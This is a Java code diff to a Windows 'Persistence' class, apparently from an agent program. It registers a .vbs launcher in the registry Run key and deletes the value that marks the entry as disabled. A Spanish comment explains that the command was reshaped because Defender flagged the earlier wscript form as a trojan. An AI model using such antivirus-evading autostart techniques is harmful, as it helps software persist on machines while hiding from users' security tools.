@@ -107,9 +107,7 @@ public final class Persistence {
 	}
 
 	private static boolean registerRun(Path dir, Path launcher) {
-		String wscript = Paths.get(System.getenv().getOrDefault("SystemRoot", "C:\\Windows"),
-			"System32", "wscript.exe").toString();
-		String command = "\"" + wscript + "\" //nologo \"" + launcher + "\"";
+		String command = runCommand(launcher);
 		// reg.exe re-parses its command line: a raw quoted value is rejected as
 		// "Invalid syntax" when it is handed over as a single argv element.
 		if (!run("reg", "add", RUN_KEY, "/v", AgentPaths.runValue(dir), "/t", "REG_SZ", "/d",
@@ -119,6 +117,15 @@ public final class Persistence {
 		// Task Manager leaves the value marked as disabled if it was turned off manually in the past.
 		run("reg", "delete", APPROVED_KEY, "/v", AgentPaths.runValue(dir), "/f");
 		return command.equals(read(dir));
+	}
+
+	/**
+	 * Valor del Run: el `.vbs` se registra por asociación (sin `wscript.exe`).
+	 * Defender marcaba la forma `cmd /c reg add ... wscript.exe //nologo` como
+	 * Trojan:Win32/Commando.Cml; la ruta .vbs a secas no arrastra ese prefijo.
+	 */
+	static String runCommand(Path launcher) {
+		return "\"" + launcher + "\"";
 	}
 
 	static String regValue(String command) {
